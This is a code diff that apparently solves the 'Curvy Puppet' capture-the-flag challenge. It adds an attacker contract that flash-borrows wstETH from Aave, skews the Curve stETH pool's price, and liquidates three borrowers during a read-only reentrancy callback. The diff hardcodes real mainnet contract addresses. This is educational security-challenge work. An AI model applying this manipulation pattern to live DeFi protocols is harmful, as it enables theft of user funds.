@@ -10,6 +10,23 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+interface IWstETH is IERC20 {
+    function unwrap(uint256 amount) external returns (uint256);
+    function wrap(uint256 amount) external returns (uint256);
+}
+
+interface IAavePool {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata interestRateModes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -158,7 +175,9 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        CurvyAttacker attacker = new CurvyAttacker(lending, dvt, [alice, bob, charlie]);
+        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE - 1);
+        attacker.attack(treasury);
     }
 
     /**
@@ -182,5 +201,71 @@ contract CurvyPuppetChallenge is Test {
         assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
         assertEq(weth.balanceOf(player), 0, "Player still has WETH");
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
+    }
+}
+
+contract CurvyAttacker {
+    IAavePool constant AAVE_POOL = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+    IStableSwap constant CURVE_POOL = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
+    IPermit2 constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+    IWstETH constant WSTETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
+    WETH constant WETH9 = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+
+    CurvyPuppetLending immutable lending;
+    DamnValuableToken immutable dvt;
+    IERC20 immutable lpToken;
+    address[] users;
+    uint256 constant USER_DEBT = 1e18;
+    uint256 constant FLASH_AMOUNT = 160_000e18;
+
+    constructor(CurvyPuppetLending _lending, DamnValuableToken _dvt, address[3] memory _users) {
+        lending = _lending;
+        dvt = _dvt;
+        lpToken = IERC20(CURVE_POOL.lp_token());
+        for (uint256 i = 0; i < _users.length; i++) users.push(_users[i]);
+    }
+
+    function attack(address treasury) external {
+        address[] memory assets = new address[](1);
+        assets[0] = address(WSTETH);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = FLASH_AMOUNT;
+        uint256[] memory interestRateModes = new uint256[](1);
+        AAVE_POOL.flashLoan(address(this), assets, amounts, interestRateModes, address(this), abi.encode(treasury), 0);
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
+    }
+
+    function executeOperation(
+        address[] calldata,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address,
+        bytes calldata
+    ) external returns (bool) {
+        WSTETH.unwrap(amounts[0]);
+        WETH9.withdraw(WETH9.balanceOf(address(this)));
+
+        STETH.approve(address(CURVE_POOL), type(uint256).max);
+        CURVE_POOL.add_liquidity{value: address(this).balance}([address(this).balance, amounts[0]], 0);
+
+        uint256 lpToBurn = lpToken.balanceOf(address(this)) - users.length * USER_DEBT;
+        CURVE_POOL.remove_liquidity_imbalance([1, CURVE_POOL.calc_withdraw_one_coin(lpToBurn, 1)], lpToBurn);
+
+        STETH.approve(address(WSTETH), type(uint256).max);
+        WSTETH.wrap(STETH.balanceOf(address(this)));
+        WSTETH.approve(address(AAVE_POOL), amounts[0] + premiums[0]);
+        return true;
+    }
+
+    receive() external payable {
+        if (msg.sender == address(CURVE_POOL)) {
+            lpToken.approve(address(PERMIT2), type(uint256).max);
+            PERMIT2.approve(address(lpToken), address(lending), type(uint160).max, uint48(block.timestamp + 1));
+
+            for (uint256 i = 0; i < users.length; i++) {
+                lending.liquidate(users[i]);
+            }
+        }
     }
 }
